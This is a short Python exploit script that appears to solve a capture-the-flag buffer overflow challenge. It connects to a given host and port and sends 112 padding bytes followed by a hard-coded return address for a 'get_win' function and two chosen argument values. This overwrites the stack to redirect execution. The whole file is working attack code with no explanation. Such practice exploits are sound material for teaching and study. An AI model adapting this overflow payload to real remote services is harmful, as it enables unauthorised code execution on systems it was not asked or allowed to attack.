#!/usr/bin/env python3

import argparse
import socket
import struct

parse = argparse.ArgumentParser()
# Enter IP/Hostname to command
parse.add_argument(
        "host",
        type=str,
        help="Enter hostname or IP Addr to connect")

#Enter port to command
parse.add_argument(
        "port",
        type=int,
        help="Enter port to connect")

input = parse.parse_args()

get_win = b"\x96\x92\x04\x08"
args1 = b"\x0D\xF0\xFE\xCA"
args2 = b"\x0D\xF0\x0D\xF0"

payload = (b"a"*112 + get_win + b"b"*4 + args1 + args2 + b"\n")

with socket.socket() as s:
        # Connect to host
        s.connect((input.host, input.port))
        # Receive message from host
        print(s.recv(4096).decode("utf-8"))
	# Send payload to host
        s.send(payload)
        print(s.recv(4096).decode("latin1"))
        print(s.recv(4096).decode("latin1"))
